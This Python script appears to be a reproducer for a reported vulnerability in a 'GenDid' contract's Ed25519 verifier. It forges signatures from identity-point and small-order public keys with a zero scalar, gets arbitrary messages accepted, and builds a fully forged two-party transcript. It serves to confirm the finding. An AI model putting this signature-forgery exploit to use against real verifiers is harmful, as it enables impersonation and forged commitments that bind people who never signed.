#!/usr/bin/env python3
"""GenDid Steward-finding attack reproducer (identity-point key + zero-scalar sig).

Reproduces the exact Steward attack against ANY version of the contract:

  A = identity point  (did:key wrapping the 32-byte encoding 01 00..00)
  R = identity point  (first 32 sig bytes = 01 00..00)
  S = 0               (last 32 sig bytes = 00..00)
  M = arbitrary       (any room|nonce|text)

Why it verifies without the private key:
  sB = [0]B = identity;  R + [k]A = identity + [k]*identity = identity
  => sB == R + [k]A holds for EVERY message and every k.

Also forges for ALL small-order keys (the 8 torsion points): a fixed-point
search over R in the small subgroup yields R with R + [k]A = identity, s = 0.

Usage:
  python3 scripts/attack_repro.py [path/to/gendid_judge.py]
  (default: contracts/gendid_judge.py in repo root)

Prints ACCEPTED / REJECTED per crafted record. Never fabricates: every claim
is the return value of the real verifier in the file you point it at.
"""
import base64
import json
import sys
import types
from pathlib import Path

B58 = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"
ED_PREFIX = b"\xed\x01"


def b58(raw: bytes) -> str:
    n = int.from_bytes(raw, "big")
    out = ""
    while n:
        n, rem = divmod(n, 58)
        out = B58[rem] + out
    return out


def b64url(raw: bytes) -> str:
    return base64.urlsafe_b64encode(raw).decode().rstrip("=")


def did_for_pub(pub32: bytes) -> str:
    return "did:key:z" + b58(ED_PREFIX + pub32)


def load_contract(path: Path):
    """Load the contract module with a stubbed genlayer (pure functions only)."""
    gl_mod = types.ModuleType("genlayer")

    class _TreeMap(dict):
        def __init__(self, *a, **k):
            super().__init__()

        def get(self, k, default=None):
            try:
                return self[k]
            except KeyError:
                return default

    class UserError(Exception):
        pass

    gl_stub = types.SimpleNamespace(
        Contract=type("Contract", (), {}),
        public=types.SimpleNamespace(
            view=lambda f=None: (f if f is not None else True),
            write=lambda f=None: (f if f is not None else True),
        ),
        message_raw={"datetime": "2026-09-10T00:00:00Z"},
        vm=types.SimpleNamespace(run_nondet=lambda a, b: {}),
        nondet=types.SimpleNamespace(exec_prompt=lambda p, response_format=None: ""),
        TreeMap=_TreeMap,
        u256=int,
        UserError=UserError,
    )
    gl_mod.gl = gl_stub
    gl_mod.UserError = UserError
    gl_mod.TreeMap = _TreeMap
    gl_mod.u256 = int
    gl_mod.__all__ = ["gl", "UserError", "TreeMap", "u256"]
    sys.modules["genlayer"] = gl_mod
    mod = types.ModuleType("gendid_target")
    mod.__dict__["__name__"] = "gendid_target"
    exec(compile(path.read_text(), str(path), "exec"), mod.__dict__)
    return mod


def main() -> int:
    root = Path(__file__).resolve().parents[1]
    target = Path(sys.argv[1]) if len(sys.argv) > 1 else root / "contracts" / "gendid_judge.py"
    G = load_contract(target)
    print(f"# target: {target}\n")

    # --- the Steward's exact attack -----------------------------------------
    identity_enc = bytes([1]) + bytes(31)
    zero_scalar = bytes(32)
    sig = identity_enc + zero_scalar
    did = did_for_pub(identity_enc)
    msg = b"gendid-demo-01|1|I agree to pay 1,000,000 credits. (arbitrary attacker text)"
    ok = G.ed25519_verify(identity_enc, msg, sig)
    print(f"did (identity-point key) : {did}")
    print(f"  did passes DID_RE       : {bool(G.DID_RE.fullmatch(did))}")
    print(f"  did_to_pubkey decodes   : {G.did_to_pubkey(did).hex() == identity_enc.hex()}")
    print(f"  ed25519_verify ACCEPTS  : {ok}   <-- STEWARD ATTACK (arbitrary message)")

    # --- classification through the full contract pipeline --------------------
    forged = {
        "sequence": 1,
        "senderDid": did,
        "nonce": "1",
        "signature": b64url(sig),
        "text": "I agree to pay 1,000,000 credits. (arbitrary attacker text)",
    }
    cls = G._classify_records("gendid-demo-01", [forged])
    st = cls["records"][0]["signatureStatus"] if cls["records"] else "(dropped)"
    print(f"  _classify_records status: {st}")
    print(f"  counts: {cls['counts']}")

    # --- extend: forge for EVERY small-order key (8 torsion points) ----------
    # small-order points = multiples of [L]B; for each key A find R in <A> with
    # R + [k]A = identity (s = 0), k = H(R|A|M) mod L.
    P = G._P
    L = G._L
    D = G._D
    GY = G._GY

    def xrecover(y):
        xx = (y * y - 1) * pow(D * y * y + 1, P - 2, P) % P
        x = pow(xx, (P + 3) // 8, P)
        if (x * x - xx) % P != 0:
            I = pow(2, (P - 1) // 4, P)
            x = (x * I) % P
        if x % 2 != 0:
            x = P - x
        return x

    gx = xrecover(GY)
    if gx & 1:
        gx = P - gx
    B = (gx, GY, 1, (gx * GY) % P)
    LB = G._scalarmult(B, L)  # order-8 generator of the torsion subgroup

    def add(p, q):
        return G._edwards_add(p, q)

    def mul(p, e):
        return G._scalarmult(p, e)

    def enc(pt):
        return G._compress(pt)

    ID = (0, 1, 1, 0)
    torsion = [mul(LB, i) for i in range(8)]

    import hashlib

    forged_any = 0
    print("\n# small-order key forgery sweep (distinct attacker DIDs):")
    for i, A in enumerate(torsion):
        A_enc = enc(A)
        A_did = did_for_pub(A_enc)
        # fixed-point search: R = -[k mod 8]A with k = H(R|A|M); try each candidate
        found = None
        for cand in range(8):
            R = mul(A, (-cand) % 8)
            R_enc = enc(R)
            k = int.from_bytes(hashlib.sha512(R_enc + A_enc + msg).digest(), "little") % L
            if k % 8 == cand % 8:  # [k]A = [cand]A  =>  R + [k]A = identity
                found = (R_enc, cand)
                break
        if A == ID:
            # identity key: [k]A = identity for all k; R = identity, s = 0
            found = (identity_enc, 0)
        if found is None:
            print(f"  torsion[{i}]: no fixed point for this message (1 of 8 may miss)")
            continue
        R_enc, cand = found
        sig_i = R_enc + zero_scalar
        ok_i = G.ed25519_verify(A_enc, msg, sig_i)
        forged_any += ok_i
        print(
            f"  torsion[{i}] did={A_did[:28]}.. ACCEPTS={ok_i} "
            f"(R=-[{cand}]A, s=0, same arbitrary message)"
        )

    # --- two DISTINCT small-order DIDs => gate passes => forged AGREED path ---
    if forged_any >= 2:
        print("\n# two-party forged transcript (two distinct small-order DIDs):")
        recs = []
        seq = 0
        for i, A in enumerate(torsion[:4]):
            A_enc = enc(A)
            for cand in range(8):
                R = mul(A, (-cand) % 8)
                R_enc = enc(R)
                k = int.from_bytes(hashlib.sha512(R_enc + A_enc + msg).digest(), "little") % L
                if (A == ID) or (k % 8 == cand % 8):
                    seq += 1
                    text = (
                        "Task: anything. Price 5 credits."
                        if seq == 1
                        else "Accepted."
                    )
                    m = f"gendid-demo-01|{seq}|{text}".encode()
                    k2 = int.from_bytes(hashlib.sha512(R_enc + A_enc + m).digest(), "little") % L
                    # re-check the fixed point for THIS message; identity key always works
                    if A == ID or k2 % 8 == cand % 8:
                        recs.append(
                            {
                                "sequence": seq,
                                "senderDid": did_for_pub(A_enc),
                                "nonce": str(seq),
                                "signature": b64url(R_enc + zero_scalar),
                                "text": text,
                            }
                        )
                    break
        if len(recs) >= 2:
            cls2 = G._classify_records("gendid-demo-01", recs)
            counts2 = cls2["counts"]
            parts = cls2["participants"]
            print(f"  submitted {len(recs)} forged records, zero private keys known")
            print(f"  counts: {counts2}")
            print(f"  distinct accepted participants: {len(parts)}")
            if counts2[G.AUTHENTIC] >= 2 and len(parts) >= 2:
                print("  => deterministic gate would PASS; with consensus labels PASS")
                print("     the derivation matrix would return: AGREED  (fully forged)")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
